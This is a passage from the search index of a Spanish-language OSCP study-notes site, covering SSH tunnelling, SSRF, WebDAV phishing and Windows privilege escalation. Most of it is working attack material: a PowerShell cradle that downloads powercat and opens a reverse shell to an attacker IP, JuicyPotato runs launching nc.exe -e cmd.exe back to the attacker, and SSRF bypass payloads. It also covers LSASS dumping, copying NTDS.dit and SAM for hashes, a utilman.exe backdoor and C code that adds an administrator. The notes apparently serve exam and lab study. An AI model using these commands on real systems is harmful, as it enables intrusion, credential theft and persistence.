tenemos que usar una interface completa junto con un proxy</li> </ul> <ul> <li>Ac\u00e1 el servidor ssh empieza escuchando en el puerto 9050 de nuestra maquina atacante y va a ser redirigida.</li> </ul>"},{"location":"OSCP/sshPortForwardingProxychains/#dynamic-port-forwarding-ssh-socks-tunneling","title":"Dynamic Port forwarding SSH &amp; Socks tunneling","text":"<p><code>ssh -D 9050 user@host</code></p> <ul> <li>El argumento <code>-D</code> peticiona al servidor SSH que se habilite el reenv\u00edo de puertos dinamirocs.</li> <li>Una vez que est\u00e9 esto habilitado utilizamos una herramienta que routee los paquetes a ese puerto como proxychains con SOCKS4/5.</li> </ul> <pre><code>GNT@htb[/htb]$ tail -4 /etc/proxychains.conf\n# meanwile\n# defaults set to \"tor\"\nsocks4  127.0.0.1 9050\n</code></pre> <ul> <li>Luego para todos los comandos ten\u00e9s que poner antes proxychains, ejemplo: <code>proxychains nmap -v -sn 172.16.5.1-200</code></li> <li>Esto es un ping sweep para ver todos los host de la red</li> </ul>"},{"location":"OSCP/ssrf/","title":"Server Side Request Forgery (SSRF)","text":""},{"location":"OSCP/ssrf/#que-es-ssrf","title":"\u00bfQu\u00e9 es SSRF?","text":"<p>La vulnerabilidad Server Side Request Forgery (SSRF) ocurre cuando un atacante puede manipular un servidor para que realice solicitudes HTTP a recursos internos o externos que normalmente no ser\u00edan accesibles para el atacante.</p>"},{"location":"OSCP/ssrf/#impacto","title":"Impacto","text":"<p>Un ataque SSRF puede permitir: - Acceder a recursos internos de la red, como bases de datos o servicios internos. - Filtrar informaci\u00f3n sensible. - Realizar ataques adicionales, como escaneo de puertos internos o explotaci\u00f3n de servicios vulnerables.</p>"},{"location":"OSCP/ssrf/#ejemplo","title":"Ejemplo","text":"<pre><code>POST /upload-cover HTTP/1.1\n\nHost: editorial.htb\n\nContent-Length: 307\n\nAccept-Language: en-US,en;q=0.9\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36\n\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryQ7BYZLc1jmNjS53B\n\nAccept: */*\n\nOrigin: http://editorial.htb\n\nReferer: http://editorial.htb/upload\n\nAccept-Encoding: gzip, deflate, br\n\nConnection: keep-alive\n\n\n\n------WebKitFormBoundaryQ7BYZLc1jmNjS53B\n\nContent-Disposition: form-data; name=\"bookurl\"\n\n\n\nhttp://127.0.0.1:5000\n\n------WebKitFormBoundaryQ7BYZLc1jmNjS53B\n\nContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\n\nContent-Type: application/octet-stream\n\n\n\n\n\n------WebKitFormBoundaryQ7BYZLc1jmNjS53B--\n</code></pre> <ul> <li>En este ejemplo se env\u00eda una solicitud POST a <code>editorial.htb</code> con un archivo de libro y una URL de imagen.</li> <li>en el puerto 5000 hay un servicio vulnerable que puede ser explotado.</li> </ul>"},{"location":"OSCP/ssrf/#ssrf-cheatsheet-ayudas","title":"SSRF Cheatsheet Ayudas","text":""},{"location":"OSCP/ssrf/#comandos-utiles-para-pruebas-ssrf","title":"Comandos \u00fatiles para pruebas SSRF","text":"<ul> <li>Comprobar acceso a recursos internos: <pre><code>curl -X POST -d \"bookurl=http://127.0.0.1:80\" http://target.com/upload\n</code></pre></li> <li>Escaneo de puertos internos: <pre><code>for port in {1..65535}; do curl -s -o /dev/null -w \"%{http_code} - Port $port\\n\" http://127.0.0.1:$port; done\n</code></pre></li> <li>Probar acceso a metadatos en servicios cloud: <pre><code>curl http://169.254.169.254/latest/meta-data/\n</code></pre></li> </ul>"},{"location":"OSCP/ssrf/#herramientas-utiles","title":"Herramientas \u00fatiles","text":"<ul> <li>Burp Suite: Configura un payload SSRF en el repeater para probar diferentes endpoints.</li> <li>SSRFmap: Automatiza la explotaci\u00f3n de SSRF.     <pre><code>python3 ssrfmap.py -u \"http://target.com/upload?url=xxURLxx\" -p xxURLxx\n</code></pre></li> <li>HTTPie: Alternativa a <code>curl</code> para pruebas HTTP.     <pre><code>http POST http://target.com/upload bookurl=http://127.0.0.1:80\n</code></pre></li> </ul>"},{"location":"OSCP/ssrf/#payloads-comunes","title":"Payloads comunes","text":"<ul> <li>Acceso a localhost: <pre><code>http://127.0.0.1:80\n</code></pre></li> <li>Bypass de validaciones: <pre><code>http://127.0.0.1#target.com\nhttp://127.0.0.1@target.com\n</code></pre></li> <li>Probar diferentes protocolos: <pre><code>file:///etc/passwd\ngopher://127.0.0.1:11211/_stats\n</code></pre></li> </ul>"},{"location":"OSCP/ssrf/#recursos-adicionales","title":"Recursos adicionales","text":"<ul> <li>PayloadsAllTheThings SSRF</li> <li>OWASP SSRF Guide</li> </ul>"},{"location":"OSCP/ssrf/#ssrf-cheatsheet-ayudas_1","title":"SSRF Cheatsheet ayudas","text":""},{"location":"OSCP/webdav-phishing/","title":"Crear .library-ms para que junto con un WebDav Server me permita ejecutar c\u00f3digo remoto","text":"<ul> <li>Este tipo de ataques en OSCP se ven si ves un mail server como <code>hMailServer</code></li> <li>Los archivos <code>.library-ms</code> son usados por Windows para mostrar \"librer\u00edas\" (documentos, m\u00fasica, etc.), y pueden apuntar a recursos remotos como WebDAV.</li> </ul>"},{"location":"OSCP/webdav-phishing/#plantilla-configlibrary-ms","title":"Plantilla: config.Library-ms","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"http://schemas.microsoft.com/windows/2009/library\"&gt;\n  &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n  &lt;version&gt;6&lt;/version&gt;\n  &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n  &lt;iconReference&gt;imageres.dll,-100&lt;/iconReference&gt;\n  &lt;templateInfo&gt;\n    &lt;folderType&gt;{7D49D726-3C21-4F05-99AA-FDC2C9474656}&lt;/folderType&gt;\n  &lt;/templateInfo&gt;\n  &lt;searchConnectorDescriptionList&gt;\n    &lt;searchConnectorDescription&gt;\n      &lt;description&gt;Relia Files&lt;/description&gt;\n      &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n      &lt;isDefaultNonOwnerSaveLocation&gt;true&lt;/isDefaultNonOwnerSaveLocation&gt;\n      &lt;simpleLocation&gt;\n        &lt;url&gt;http://192.168.XX.XX/&lt;/url&gt; &lt;!-- Tu IP aqu\u00ed --&gt;\n      &lt;/simpleLocation&gt;\n    &lt;/searchConnectorDescription&gt;\n  &lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre>"},{"location":"OSCP/webdav-phishing/#crear-acceso-directo","title":"Crear acceso directo","text":"<ul> <li>Tenemos que desde una maquina windows crear un acceso directo que descargue powercat o cualquier otro payload.</li> <li><code>cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .</code></li> <li><code>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.210:8000/powercat.ps1'); powercat -c 192.168.45.210 -p 4444 -e powershell\"</code> </li> <li>Ahora este .lnk lo ponemos en el directorio en donde vamos a levantar nuestro webdav.</li> </ul>"},{"location":"OSCP/webdav-phishing/#levantar-webdav-en-kali","title":"Levantar webdav en kali","text":"<ul> <li><code>pip3 install wsgidav --break-system-packages</code></li> <li><code>wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/blabla/webdav</code></li> </ul>"},{"location":"OSCP/webdav-phishing/#phishing-email-example-con-swaks","title":"Phishing email example con swaks","text":"<pre><code>swaks -t jim@relia.com \\\n  --from maildmz@relia.com \\\n  --attach @config.Library-ms \\\n  --server 192.168.208.189 \\\n  --body @test.txt \\\n  --header \"Subject: Staging Script\" \\\n  --suppress-data\n</code></pre>"},{"location":"OSCP/winPrivEsc/","title":"Windows Privilege Escalation","text":""},{"location":"OSCP/winPrivEsc/#useful-tools","title":"Useful tools","text":"Tool Description Seatbelt C# project for performing a wide variety of local privilege escalation checks winPEAS WinPEAS is a script that searches for possible paths to escalate privileges on Windows hosts. All of the checks are explained here PowerUp PowerShell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found SharpUp C# version of PowerUp JAWS PowerShell script for enumerating privilege escalation vectors written in PowerShell 2.0 SessionGopher SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information Watson Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities. LaZagne Tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more Windows Exploit Suggester - Next Generation WES-NG is a tool based on the output of Windows\u2019 systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 10 is supported Sysinternals Suite We will use several tools from Sysinternals in our enumeration including AccessChk, PipeList, and PsService <ul> <li>Payload all the things Windows PrivEsc</li> <li>More Binaries</li> <li>Lista de privilegios interesantes</li> </ul>"},{"location":"OSCP/winPrivEsc/#seimpersonate-and-seassignprimarytoken","title":"SeImpersonate and SeAssignPrimaryToken","text":""},{"location":"OSCP/winPrivEsc/#seimpersonate-example-juicy-potato","title":"SeImpersonate example - Juicy Potato","text":"<ul> <li>Muchas veces cuando conseguimos un acceso a un usuario de un servicio, o sea una service account como puede ser sql server, al revisar los privilegios de ese usuario, vemos que tiene el privilegio SeImpersonate..</li> <li>Podemos utilizar juicypotato para conseguir un token de servicio con el privilegio SeImpersonate.<ul> <li>Juicy potato es un script de windows que nos permite obtener un token de servicio con privilegios elevados.</li> <li>https://github.com/ohpe/juicy-potato</li> </ul> </li> <li>Explota privilegios via DCOM/NTLM (SeImpersonate).</li> <li><code>JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\" -t *</code><ul> <li>explicaci\u00f3n del comando:<ul> <li><code>-l 53375</code> es el puerto que se va a utilizar para la comunicaci\u00f3n.</li> <li><code>-p c:\\windows\\system32\\cmd.exe</code> es la ruta de la binary que se va a ejecutar.</li> <li><code>-a \"/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\"</code> es la argumento que se va a pasar a la binary que se va a ejecutar.</li> <li><code>-t *</code> es el token de servicio que se va a utilizar.</li> </ul> </li> </ul> </li> <li>Es importante tener en cuenta los CLSID, para extraerlos de la maquina podemos usar GetCLSID.ps1<ul> <li>Entonces por ejemplo tenemos el siguiente comando: <code>.\\Juicy.Potato.x86.exe -l 53375 -p c:\\Windows\\System32\\cmd.exe -a \"/c c:\\wamp\\www\\nc.exe 192.168.45.210 5555 -e cmd.exe\" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}</code></li> </ul> </li> <li>Este CLSID es del proceso winmgmt dentro de windows server 2008 R2 Enterprise</li> </ul> <pre><code>C:\\wamp\\www&gt;.\\Juicy.Potato.x86.exe -l 53375 -p c:\\Windows\\System32\\cmd.exe -a \"/c c:\\wamp\\www\\nc.exe 192.168.45.210 5555 -e cmd.exe\" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}\nTesting {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 53375\n....\n[+] authresult 0\n{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\\SYSTEM\n</code></pre>"},{"location":"OSCP/winPrivEsc/#godpotato","title":"GodPotato","text":"<ul> <li>Afecta a versiones modernas si tenemos el privilegio SeImpersonatePrivilege.</li> <li>Repositorio</li> </ul> <pre><code>c:\\Users\\Public\\GodPotato-NET4.exe\n\n    FFFFF                   FFF  FFFFFFF                                                       \n   FFFFFFF                  FFF  FFFFFFFF                                                      \n  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                \n  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                \n  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                \n FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   \n FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  \n FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  \n FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF \n FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF \n  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF \n  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  \n   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   \n    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    \n\n\nArguments:\n\n    -cmd Required:True CommandLine (default cmd /c whoami)\n\nExample:\n\nGodPotato -cmd \"cmd /c whoami\" \nGodPotato -cmd \"cmd /c whoami\" \n\n\nc:\\windows\\system32\\inetsrv&gt;c:\\Users\\Public\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"\nc:\\Users\\Public\\GodPotato-NET4.exe -cmd \"cmd /c whoami\"\n[*] CombaseModule: 0x140715645927424\n[*] DispatchTable: 0x140715648233536\n[*] UseProtseqFunction: 0x140715647610064\n[*] UseProtseqFunctionParamCount: 6\n[*] HookRPC\n[*] Start PipeServer\n[*] Trigger RPCSS\n[*] CreateNamedPipe \\\\.\\pipe\\ca325e81-9e6f-49eb-a8cd-c45cec8c750b\\pipe\\epmapper\n[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046\n[*] DCOM obj IPID: 0000a802-02c0-ffff-5aab-e8e14a3bd34a\n[*] DCOM obj OXID: 0x2efb74e345b53fb6\n[*] DCOM obj OID: 0x8313c62f83938f2f\n[*] DCOM obj Flags: 0x281\n[*] DCOM obj PublicRefs: 0x0\n[*] Marshal Object bytes len: 100\n[*] UnMarshal Object\n[*] Pipe Connected!\n[*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] CurrentsImpersonationLevel: Impersonation\n[*] Start Search System Token\n[*] PID : 924 Token:0x816  User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation\n[*] Find System Token : True\n[*] UnmarshalObject: 0x80070776\n[*] CurrentUser: NT AUTHORITY\\SYSTEM\n[*] process start with pid 4932\nnt authority\\system\n</code></pre>"},{"location":"OSCP/winPrivEsc/#rogue-potato","title":"Rogue Potato","text":"<ul> <li>RoguePotato es un script de windows que nos permite obtener un token de servicio con privilegios elevados.</li> </ul> <pre><code>SQL (WINLPE-SRV01\\sql_dev  dbo@master)&gt; xp_cmdshell c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.14.195 8443 -e cmd.exe\" -t *\noutput                                                       \n----------------------------------------------------------   \nTesting {4991d34b-80a1-4291-83b6-3328366b9097} 53375         \n\n......                                                       \n\n[+] authresult 0                                             \n\n{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\\SYSTEM   \n\nNULL                                                         \n\n[+] CreateProcessWithTokenW OK                               \n\n[+] calling 0x000000000088ce08                               \n\nNULL                                                         \n\nSQL (WINLPE-SRV01\\sql_dev  dbo@master)&gt; \n</code></pre> <ul> <li>Ahora en nuestra maquina atacante podemos escuchar en el puerto 8443.</li> </ul> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nc -lvnp 8443\nlistening on [any] 8443 ...\nconnect to [10.10.14.195] from (UNKNOWN) [10.129.43.43] 49686\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nnt authority\\system\n\nC:\\Windows\\system32&gt;\n</code></pre>"},{"location":"OSCP/winPrivEsc/#sedebugprivilege","title":"SeDebugPrivilege","text":"<ul> <li>Muchas veces cuando conseguimos un acceso a un usuario de un servicio, o sea una service account como puede ser sql server, al revisar los privilegios de ese usuario, vemos que tiene el privilegio SeDebugPrivilege.</li> <li>Podemos usar ProcDump de Sysinternals para conseguir un un dump de memoria LSASS.</li> <li><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp</code><ul> <li>Ahora con esto podemos usar pypykatz en nuestra maquina atacante, o mimikatz en la maquina victima para obtener las credenciales de los servicios.</li> </ul> </li> </ul> <pre><code>mimikatz # log\nUsing 'mimikatz.log' for logfile : OK\n\nmimikatz # sekurlsa::minidump lsass.dmp\nSwitch to MINIDUMP : 'lsass.dmp'\n\nmimikatz # sekurlsa::logonpasswords\nOpening : 'lsass.dmp' file for minidump...\n</code></pre> <ul> <li><code>pypykatz lsa minidump 'lsass (1).dmp'</code></li> <li>De todas formas siempre podemos dumpear a mano con el task manager.</li> <li></li> </ul>"},{"location":"OSCP/winPrivEsc/#rce-con-sedebugprivilege","title":"RCE con SeDebugPrivilege","text":"<ul> <li>Se pueden elevar los privilegios ejecutando un proceso hijo con privilegios eleveados heredando los privilegios de un proceso padre.</li> <li>Podemos utilizar el siguiente script<ul> <li><code>[MyProcess]::CreateProcessFromParent(&lt;system_pid&gt;,&lt;command_to_execute&gt;,\"\")</code></li> </ul> </li> </ul>"},{"location":"OSCP/winPrivEsc/#migrar-proceso-lsass-a-un-proceso-con-sedebugprivilege","title":"Migrar proceso lsass a un proceso con SeDebugPrivilege","text":"<ul> <li>Si tenemos el privilegio SeDebugPrivilege podemos migrar el proceso lsass.</li> </ul> <pre><code>PS C:\\Users\\Public&gt; Get-Process lsass\nGet-Process lsass\n\nHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  \n-------  ------    -----      -----     ------     --  -- -----------                                                  \n   1299      32     7200      19236       5.56    672   0 lsass                                          \n</code></pre> <pre><code>meterpreter &gt; migrate 672\n[*] Migrating from 6648 to 672...\n[*] Migration completed successfully.\n\nmeterpreter &gt; getsystem\n[-] Already running as SYSTEM\n</code></pre> <ul> <li>Tambi\u00e9n podemos usar este script para activar todos los tokens privs EnableAllTokenPrivs</li> </ul>"},{"location":"OSCP/winPrivEsc/#setakeownerprivilege","title":"SeTakeOwnerPrivilege","text":"<ul> <li>Este privilegio permite la habilidad de tomar ownership de cualquier objeto.<ul> <li>NTFS, Registry, File, Process, Thread, Semaphore, Mutex, Desktop, Window Station, Message Queue, Job, and Section.</li> </ul> </li> <li>Este privilegio asigna permisos WRITE_OWNER para el objeto especificado.</li> <li>Se puede intentar habilitar este privilegio usando el siguieunte script</li> </ul> <pre><code>PS C:\\htb&gt; Import-Module .\\Enable-Privilege.ps1\nPS C:\\htb&gt; .\\EnableAllTokenPrivs.ps1\nPS C:\\htb&gt; whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                              State\n============================= ======================================== =======\nSeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                 Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set           Enabled\n</code></pre> <ul> <li>Despu\u00e9s tenemos que elegir un archivo objetivo para la operaci\u00f3n de tomar ownership.<ul> <li>Ejemplo: <code>cmd /c dir /q 'C:\\Department Shares\\Private\\IT'</code><ul> <li>Explicaci\u00f3n del comando:<ul> <li><code>cmd</code> es el comando que se va a ejecutar.</li> <li><code>/c</code> es la opci\u00f3n que indica que se va a ejecutar el comando.</li> <li><code>dir</code> es el comando que se va a ejecutar.</li> <li><code>/q</code> es la opci\u00f3n que indica que se va a mostrar el resultado de la operaci\u00f3n.</li> <li><code>'C:\\Department Shares\\Private\\IT'</code> es el objetivo de la operaci\u00f3n de tomar ownership.</li> </ul> </li> </ul> </li> <li>`takeown /f 'C:\\Department Shares\\Private\\IT\\cred.txt'</li> <li><code>icacls 'C:\\Department Shares\\Private\\IT\\cred.txt' /grant htb-student:F</code></li> <li>Ahora con esto podemos tomar ownership de un archivo.</li> </ul> </li> </ul>"},{"location":"OSCP/winPrivEsc/#en-donde-conviene-usar-esta-tecnica-de-tomar-ownership","title":"En donde conviene usar esta t\u00e9cnica de tomar ownership","text":"<pre><code>c:\\inetpub\\wwwwroot\\web.config\n%WINDIR%\\repair\\sam\n%WINDIR%\\repair\\system\n%WINDIR%\\repair\\software, %WINDIR%\\repair\\security\n%WINDIR%\\system32\\config\\SecEvent.Evt\n%WINDIR%\\system32\\config\\default.sav\n%WINDIR%\\system32\\config\\security.sav\n%WINDIR%\\system32\\config\\software.sav\n%WINDIR%\\system32\\config\\system.sav\n</code></pre>"},{"location":"OSCP/winPrivEsc/#serestoreprivilege","title":"SeRestorePrivilege","text":"<ol> <li>Launch PowerShell/ISE with the SeRestore privilege present.</li> <li>Enable the privilege with Enable-SeRestorePrivilege).</li> <li>Rename utilman.exe to utilman.old</li> <li>Rename cmd.exe to utilman.exe</li> <li>Lock the console and press Win+U</li> <li><code>Rename-Item -Path \"C:\\Windows\\System32\\utilman.exe\" -NewName \"utilman.old\"</code></li> <li><code>ren cmd.exe Utilman.exe</code></li> <li>Ahora podemos utilizar rdesktop para conectarnos a la maquina y ejecutar el cmd.exe con el privilegio SeRestorePrivilege.<ul> <li><code>rdesktop IP</code></li> <li>WIN + U<ul> <li><code>whoami =&gt; nt authority\\system</code></li> </ul> </li> </ul> </li> <li>Tambi\u00e9n podemos reemplazar utilman por otra cosa, por ejemplo un reverse shell, o un binario que nos haga persistencia.</li> </ol>"},{"location":"OSCP/winPrivEsc/#sebackupprivilege","title":"SeBackupPrivilege","text":"<ul> <li>Este privilegio permite la habilidad de leer cualquier archivo del sistema y realizar copias de seguridad de esos archivos.</li> <li><code>Get-SeBackupPrivilege</code></li> <li>Se puede intentar habilitar este privilegio usando el siguieunte script</li> </ul> <pre><code>PS C:\\htb&gt; Set-SeBackupPrivilege\nPS C:\\htb&gt; Get-SeBackupPrivilege\n\nSeBackupPrivilege is enabled\n</code></pre>"},{"location":"OSCP/winPrivEsc/#copiar-un-archivo-protegido","title":"Copiar un archivo protegido","text":"<ul> <li><code>PS C:\\htb&gt; Copy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt</code></li> </ul>"},{"location":"OSCP/winPrivEsc/#atacando-el-dc-copiando-ntdsdit","title":"Atacando el DC, copiando NTDS.dit","text":"<ul> <li>Este grupo tambi\u00e9n nos permite hacer cosas interesantes como tomar el NTSD.dit del DC y copiarlo en una maquina que no tenga permisos de administrador..<ul> <li>Este archivo contiene hashes NTLM de todos los usuarios bajo el dominio.</li> <li>Podemos utilizar diskshadow para copiar el disco C y exponerlo como disco E.</li> </ul> </li> </ul> <pre><code>PS C:\\htb&gt; diskshadow.exe\n\nMicrosoft DiskShadow version 1.0\nCopyright (C) 2013 Microsoft Corporation\nOn computer:  DC,  10/14/2020 12:57:52 AM\n\nDISKSHADOW&gt; set verbose on\nDISKSHADOW&gt; set metadata C:\\Windows\\Temp\\meta.cab\nDISKSHADOW&gt; set context clientaccessible\nDISKSHADOW&gt; set context persistent\nDISKSHADOW&gt; begin backup\nDISKSHADOW&gt; add volume C: alias cdrive\nDISKSHADOW&gt; create\nDISKSHADOW&gt; expose %cdrive% E:\nDISKSHADOW&gt; end backup\nDISKSHADOW&gt; exit\n\nPS C:\\htb&gt; dir E:\n</code></pre> <ul> <li><code>Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit</code></li> </ul>"},{"location":"OSCP/winPrivEsc/#copiando-los-registros-sam-y-system","title":"Copiando los registros SAM y SYSTEM","text":"<ul> <li>Este privilegio tambi\u00e9n nos permite copiar los registros SAM y SYSTEM. Lo cual nos permite extraer credenciales de los usuarios mediante impacket-secretsdump.</li> </ul> <pre><code>C:\\htb&gt; reg save HKLM\\SYSTEM SYSTEM.SAV\n\nThe operation completed successfully.\n\n\nC:\\htb&gt; reg save HKLM\\SAM SAM.SAV\n\nThe operation completed successfully.\n</code></pre>"},{"location":"OSCP/winPrivEsc/#extrayendo-los-hashes","title":"Extrayendo los hashes","text":"<ul> <li><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</code></li> </ul>"},{"location":"OSCP/winPrivEsc/#usando-robocopy-para-copiar-archivos","title":"Usando robocopy para copiar archivos","text":"<ul> <li>Robocopy es un programa de Windows que nos permite copiar archivos de manera recursiva.</li> <li><code>C:\\htb&gt; robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit</code></li> </ul>"},{"location":"OSCP/winPrivEsc/#abusar-de-servicios-con-permisos-debiles-mediante-su-binary-path","title":"Abusar de servicios con permisos debiles mediante su binary path","text":"<ul> <li>Muchas veces los servicios corren con permisos debiles y podemos abusar de esto cambiando el path de su binario.</li> <li>Para enumearar podemos utilizar SharpUp.<ul> <li><code>PS C:\\htb&gt; .\\SharpUp.exe audit</code></li> </ul> </li> <li>Tambi\u00e9n podemos enumerar esto con PowerUp de PowerShell.<ul> <li><code>Import-Module .\\PowerUp.ps1</code></li> <li><code>Get-ModifiableServiceFile</code></li> </ul> </li> </ul>"},{"location":"OSCP/winPrivEsc/#reemplazando-el-binario-de-un-servicio","title":"Reemplazando el binario de un servicio","text":"<pre><code>C:\\htb&gt; cmd /c copy /Y SecurityService.exe \"C:\\Program Files (x86)\\PCProtect\\SecurityService.exe\"\nC:\\htb&gt; sc start SecurityService\n</code></pre>"},{"location":"OSCP/winPrivEsc/#cambiando-el-path-binario-de-un-servicio","title":"Cambiando el path binario de un servicio","text":"<ul> <li><code>C:\\htb&gt; sc config WindscribeService binpath=\"cmd /c net localgroup administrators USER /add\"</code></li> <li><code>sc stop WindscribeService</code></li> <li><code>sc start WindscribeService</code></li> <li><code>net localgroup administrators</code></li> </ul>"},{"location":"OSCP/winPrivEsc/#enumerar-servicios-ejecutandose","title":"Enumerar servicios ejecutandose","text":"<ul> <li><code>get-process</code>: Enumera los procesos que se estan ejecutando.<ul> <li><code>get-process -Id &lt;pid&gt;</code>: Enumera el proceso con el id especificado.</li> </ul> </li> <li><code>get-service</code>: Enumera los servicios que se estan ejecutando.</li> <li><code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}</code>: Enumera los servicios que se estan ejecutando.</li> <li><code>icacls C:\\Windows\\System32\\spoolsv.exe</code>: Enumera los permisos del archivo spoolsv.exe.</li> </ul>"},{"location":"OSCP/winPrivEsc/#la-utilidad-icacls-para-ver-permisos","title":"La utilidad icacls para ver permisos","text":"M\u00e1scara Permisos F Acceso completo M Acceso de modificaci\u00f3n RX Acceso de lectura y ejecuci\u00f3n R Acceso de solo lectura W Acceso de solo escritura <pre><code>PS C:\\Users\\dave&gt; icacls \"C:\\xampp\\mysql\\bin\\mysqld.exe\"\nC:\\xampp\\mysql\\bin\\mysqld.exe NT AUTHORITY\\SYSTEM:(F)\n                              BUILTIN\\Administrators:(F)\n                              BUILTIN\\Users:(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <ul> <li>Lo que podemos hacer es cambiar el path de la binary a un archivo que queramos ejecutar, por ejemplo nc.exe o un archivo exe que ejecute una reverse shell.</li> </ul> <pre><code>#include &lt;stdlib.h&gt;\n\nint main ()\n{\n  int i;\n\n  i = system (\"net user USER PASSWORD /add\");\n  i = system (\"net localgroup administrators USER /add\");\n\n  return 0;\n}\n</code></pre>"},{"location":"OSCP/winPrivEsc/#compilando-el-binario","title":"Compilando el binario","text":"<pre><code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n</code></pre>"},{"location":"OSCP/winPrivEsc/#compilando-el-binario-para-32-bits","title":"Compilando el binario para 32 bits","text":"<pre><code>-----\n\n```bash\nx86_64-w64-mingw32-gcc rev.c -o rev.exe -lws2_32\n</code></pre>"},{"location":"OSCP/winPrivEsc/#compilando-el-binario-para-32-bits-y-dll","title":"Compilando el binario para 32 bits y DLL","text":"<pre><code>----\n\n```bash\ni686-w64-mingw32-gcc -m32 -shared -o gsm_codec.dll 45312.c -luser32\n</code></pre>"},{"location":"OSCP/winPrivEsc/#compilar-la-dll-64-bit","title":"Compilar la DLL (64-bit)","text":"<pre><code>x86_64-w64-mingw32-g++ -shared -o malicious.dll dllmain.cpp -lws2_32 -static-libgcc -static-libstdc++\n</code></pre>"},{"location":"OSCP/winPrivEsc/#para-32-bit-si-es-necesario","title":"Para 32-bit (si es necesario)","text":"<pre><code>i686-w64-mingw32-g++ -shared -o malicious32.dll dllmain.cpp -lws2_32 -static-libgcc -static-libstdc++\n</code></pre> <ul> <li>Movemos el binario mysql original, subimos el nuestro y cambiamos el path del servicio.</li> <li><code>iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe</code>: Descargamos el binario.</li> <li><code>move C:\\xampp\\mysql\\bin\\mysqld.exe mysqld.exe</code>: Movemos el binario original.</li> <li> <p><code>move .\\adduser.exe C:\\xampp\\mysql\\bin\\mysqld.exe</code>: Movemos el binario que queremos ejecutar.</p> </li> <li> <p>Ahora o reiniciamos el servicio o reiniciamos la maquina.</p> </li> <li><code>sc stop mysql</code>: Reiniciamos el servicio.</li> <li><code>sc start mysql</code>: Reiniciamos el servicio.</li> <li>O bien reiniciamos la 